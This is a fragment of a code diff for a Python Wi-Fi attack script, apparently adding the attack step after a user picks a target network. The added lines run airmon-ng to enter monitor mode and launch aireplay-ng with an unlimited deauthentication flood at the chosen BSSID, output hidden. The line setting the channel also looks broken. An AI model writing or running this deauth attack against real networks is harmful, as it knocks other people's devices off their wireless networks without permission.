@@ -103,3 +103,6 @@ while True:
 		
 hackbssid = acitve_wireless_networks[int(choice)]["BSSID"]
 hackchannel = acitve_wireless_networks[int(choice)].strip()
+
+subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
+subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
